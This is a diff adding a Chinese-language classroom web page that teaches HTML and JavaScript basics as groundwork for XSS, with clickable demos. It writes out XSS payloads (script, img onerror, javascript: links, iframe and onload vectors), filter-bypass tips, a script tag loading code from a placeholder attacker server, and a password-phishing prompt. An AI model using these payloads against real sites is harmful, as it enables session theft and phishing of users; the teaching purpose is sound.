@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS漏洞前置 - HTML&JS基础</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "微软雅黑", Arial, sans-serif;
+        }
+        body {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.8;
+            color: #333;
+        }
+        h1 {
+            text-align: center;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #3498db;
+            margin: 25px 0 15px;
+            padding-left: 10px;
+            border-left: 4px solid #3498db;
+        }
+        h3 {
+            color: #2980b9;
+            margin: 20px 0 10px;
+        }
+        .section {
+            margin-bottom: 40px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f8;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        code {
+            font-family: "Consolas", "Monaco", monospace;
+        }
+        .demo-box {
+            margin: 15px 0;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            background: #fff;
+        }
+        .note {
+            background: #fff3cd;
+            padding: 10px 15px;
+            border-left: 4px solid #ffc107;
+            margin: 15px 0;
+        }
+        button {
+            padding: 8px 15px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px 0;
+        }
+        button:hover {
+            background: #2980b9;
+        }
+    </style>
+</head>
+<body>
+    <h1>XSS漏洞前置 - HTML&JS核心基础</h1>
+
+    <!-- 第一部分：HTML基础 -->
+    <div class="section">
+        <h2>一、HTML基础（XSS的载体）</h2>
+        
+        <h3>1. 什么是HTML？</h3>
+        <p>HTML（超文本标记语言）是网页的骨架，所有网页内容都通过HTML标签组织呈现。XSS漏洞的本质是：攻击者将恶意HTML/JS代码注入到网页中，被浏览器解析执行。</p>
+
+        <h3>2. HTML基本结构</h3>
+        <pre>
+<code>&lt;!DOCTYPE html&gt;  <!-- 声明文档类型 -->
+&lt;html lang="zh-CN"&gt;  <!-- 根标签 -->
+    &lt;head&gt;  <!-- 头部：页面元信息（标题、编码等） -->
+        &lt;meta charset="UTF-8"&gt;  <!-- 字符编码 -->
+        &lt;title&gt;网页标题&lt;/title&gt;  <!-- 浏览器标签标题 -->
+    &lt;/head&gt;
+    &lt;body&gt;  <!-- 主体：网页可见内容 -->
+        这是网页正文内容
+    &lt;/body&gt;
+&lt;/html&gt;</code>
+        </pre>
+        <div class="note">
+            提示：XSS攻击主要发生在&lt;body&gt;标签内（可见内容区域），少数情况可注入到&lt;head&gt;中。
+        </div>
+
+        <h3>3. 常用HTML核心标签</h3>
+        <p>掌握这些标签是理解XSS注入的基础：</p>
+        <pre>
+<code>&lt;div&gt;普通块级容器&lt;/div&gt;
+&lt;span&gt;普通行内容器&lt;/span&gt;
+&lt;p&gt;段落标签&lt;/p&gt;
+&lt;input type="text"&gt;  <!-- 输入框（XSS常注入的位置） -->
+&lt;a href="链接地址"&gt;超链接&lt;/a&gt;
+&lt;img src="图片地址" alt="描述"&gt;  <!-- 图片标签（常用XSS绕过标签） -->
+&lt;script&gt;JS代码&lt;/script&gt;  <!-- JS执行标签（XSS核心标签） --></code>
+        </pre>
+
+        <h3>4. XSS常用标签及用法（重点）</h3>
+        <p>以下标签是XSS攻击中最常使用的，核心是让浏览器执行恶意JS代码：</p>
+        
+        <h4>（1）核心标签：&lt;script&gt;（直接执行JS）</h4>
+        <pre>
+<code><!-- 基础用法：直接写JS代码 -->
+&lt;script&gt;alert('XSS攻击！');&lt;/script&gt;
+
+<!-- 远程加载恶意JS（隐蔽性更高） -->
+&lt;script src="http://攻击者服务器/恶意.js"&gt;alert(1)&lt;/script&gt;</code>
+        </pre>
+        <div class="demo-box">
+            演示：点击按钮触发script标签执行<br>
+            <!-- 修复：动态创建script标签触发执行（innerHTML插入script不会执行） -->
+            <button onclick="
+                // 清空演示区域
+                document.getElementById('demo1').innerHTML = '';
+                // 动态创建script标签
+                var scriptTag = document.createElement('script');
+                scriptTag.textContent = 'alert(\'这是模拟XSS弹框\');';
+                document.getElementById('demo1').appendChild(scriptTag);
+            ">执行script标签</button>
+            <div id="demo1"></div>
+        </div>
+
+        <h4>（2）绕过标签：&lt;img&gt;（无闭合/跨站常用）</h4>
+        <p>当&lt;script&gt;标签被过滤时，常用img标签的事件触发JS：</p>
+        <pre>
+<code><!-- 基础用法：加载图片失败时执行JS -->
+&lt;img src="不存在的图片.jpg" onerror="alert('XSS');"&gt;
+
+<!-- 简写（无闭合）：更易绕过过滤 -->
+&lt;img src=x onerror=alert(1)&gt;</code>
+        </pre>
+        <div class="demo-box">
+            演示：img标签触发XSS<br>
+            <button onclick="document.getElementById('demo2').innerHTML='&lt;img src=x onerror=alert(\'img标签XSS\')&gt;'">执行img标签XSS</button>
+            <div id="demo2"></div>
+        </div>
+
+        <h4>（3）超链接标签：&lt;a&gt;（点击触发）</h4>
+        <pre>
+<code>&lt;a href="javascript:alert('XSS')"&gt;点击我&lt;/a&gt;</code>
+        </pre>
+        <div class="demo-box">
+            演示：点击链接触发XSS<br>
+            <!-- 修复：添加生成按钮，让链接可交互 -->
+            <button onclick="document.getElementById('demo3').innerHTML='&lt;a href=\"javascript:alert(\'链接XSS\')\"&gt;点击我&lt;/a&gt;'">生成XSS链接</button>
+            <div id="demo3"></div>
+        </div>
+
+        <h4>（4）其他绕过标签（补充）</h4>
+        <pre>
+<code><!-- iframe标签：嵌入恶意页面 -->
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+
+<!-- body事件：页面加载触发 -->
+&lt;body onload="alert('XSS')"&gt;</code>
+        </pre>
+        <div class="note">
+            核心逻辑：无论用哪个标签，最终目的都是让浏览器执行JS代码——这是XSS的本质！
+        </div>
+    </div>
+
+    <!-- 第二部分：JavaScript基础 -->
+    <div class="section">
+        <h2>二、JavaScript基础（XSS的攻击武器）</h2>
+        
+        <h3>1. JS的作用</h3>
+        <p>JavaScript是网页的“行为”层，负责：</p>
+        <ul>
+            <li>响应用户操作（点击、输入、鼠标移动）</li>
+            <li>动态修改网页内容/样式（比如修改DOM、弹窗）</li>
+            <li>与服务器交互（发送/接收数据）</li>
+        </ul>
+        <div class="note">
+            XSS利用JS的能力：窃取Cookie（document.cookie）、弹框、跳转页面、偷取用户数据、远程控制浏览器等。
+        </div>
+
+        <h3>2. JS在HTML中的执行方式</h3>
+        <pre>
+<code><!-- 方式1：内嵌在script标签中（最常用） -->
+&lt;script&gt;
+    // 单行注释
+    /* 多行注释 */
+    alert('Hello XSS');  // 执行弹框
+&lt;/script&gt;
+
+<!-- 方式2：行内事件（XSS绕过常用） -->
+&lt;div onclick="alert(1)"&gt;点击触发&lt;/div&gt;
+
+<!-- 方式3：外部文件（隐蔽） -->
+&lt;script src="http://攻击者/evil.js"&gt;&lt;/script&gt;</code>
+        </pre>
+
+        <h3>3. XSS最常用的JS弹框函数（核心演示工具）</h3>
+        <p>弹框是验证XSS漏洞是否存在的“最直观标志”，以下3个函数是课堂必讲：</p>
+        
+        <h4>（1）alert()：提示框（最常用）</h4>
+        <p>作用：弹出提示信息，阻塞页面操作，是验证XSS的“黄金标准”</p>
+        <pre><code>&lt;script&gt;alert('XSS漏洞存在！');&lt;/script&gt;</code></pre>
+        <div class="demo-box">
+            <button onclick="alert('alert弹框演示')">点击触发alert()</button>
+        </div>
+
+        <h4>（2）confirm()：确认框（带确认/取消按钮）</h4>
+        <p>作用：获取用户选择，可用于钓鱼（比如伪装系统提示）</p>
+        <pre><code>&lt;script&gt;
+    var res = confirm('是否确认删除？'); // 点确认返回true，取消返回false
+    alert('你的选择：' + res);
+&lt;/script&gt;</code></pre>
+        <div class="demo-box">
+            <button onclick="var res=confirm('模拟钓鱼确认框');alert('你的选择：'+res)">点击触发confirm()</button>
+        </div>
+
+        <h4>（3）prompt()：输入框（可窃取用户输入）</h4>
+        <p>作用：弹出带输入框的提示，可诱骗用户输入账号/密码等信息</p>
+        <pre><code>&lt;script&gt;
+    var pwd = prompt('系统升级，请输入密码：');
+    alert('你输入的密码：' + pwd); // 实际攻击中会发送到攻击者服务器
+&lt;/script&gt;</code></pre>
+        <div class="demo-box">
+            <button onclick="var pwd=prompt('模拟钓鱼输入框：请输入密码');alert('你输入的内容：'+pwd)">点击触发prompt()</button>
+        </div>
+
+        <h3>4. JS事件（触发XSS的关键）</h3>
+        <p>事件是“触发JS执行的时机”，XSS常利用事件绕过过滤（比如&lt;script&gt;被禁时，用事件触发）：</p>
+        <table style="width:100%;border-collapse:collapse;margin:10px 0;">
+            <tr style="background:#eee;">
+                <th style="border:1px solid #ddd;padding:8px;">事件名</th>
+                <th style="border:1px solid #ddd;padding:8px;">触发时机</th>
+                <th style="border:1px solid #ddd;padding:8px;">XSS示例</th>
+            </tr>
+            <tr>
+                <td style="border:1px solid #ddd;padding:8px;">onclick</td>
+                <td style="border:1px solid #ddd;padding:8px;">点击元素</td>
+                <td style="border:1px solid #ddd;padding:8px;">&lt;div onclick="alert(1)"&gt;点我&lt;/div&gt;</td>
+            </tr>
+            <tr>
+                <td style="border:1px solid #ddd;padding:8px;">onload</td>
+                <td style="border:1px solid #ddd;padding:8px;">页面/图片加载完成</td>
+                <td style="border:1px solid #ddd;padding:8px;">&lt;body onload="alert(1)"&gt;</td>
+            </tr>
+            <tr>
+                <td style="border:1px solid #ddd;padding:8px;">onerror</td>
+                <td style="border:1px solid #ddd;padding:8px;">加载失败（如图片不存在）</td>
+                <td style="border:1px solid #ddd;padding:8px;">&lt;img src=x onerror=alert(1)&gt;</td>
+            </tr>
+            <tr>
+                <td style="border:1px solid #ddd;padding:8px;">onmouseover</td>
+                <td style="border:1px solid #ddd;padding:8px;">鼠标移到元素上</td>
+                <td style="border:1px solid #ddd;padding:8px;">&lt;div onmouseover="alert(1)"&gt;移过来&lt;/div&gt;</td>
+            </tr>
+        </table>
+
+        <div class="demo-box">
+            综合演示：鼠标移到文字上触发XSS<br>
+            <div onmouseover="alert('鼠标移过来触发的XSS')" style="color:red;cursor:pointer;">请将鼠标移到我身上</div>
+        </div>
+    </div>
+
+    <!-- 课堂小结 -->
+    <div class="section">
+        <h2>三、课堂小结</h2>
+        <ol>
+            <li>HTML是XSS的“载体”：恶意代码通过HTML标签注入到网页中；</li>
+            <li>JS是XSS的“武器”：通过JS实现弹框、窃取信息、控制浏览器；</li>
+            <li>XSS核心验证：能弹出alert()，说明漏洞存在；</li>
+            <li>绕过思路：当&lt;script&gt;被过滤时，用img/a/iframe等标签+事件触发JS。</li>
+        </ol>
+        <div class="note">
+            下节课预告：XSS漏洞的分类（反射型/存储型/DOM型）、实战挖掘与防御！
+        </div>
+    </div>
+
+    <script>
+        // 页面加载完成提示
+        window.onload = function() {
+            console.log("HTML&JS基础教学页面加载完成，可开始课堂演示！");
+        }
+    </script>
+</body>
+</html>
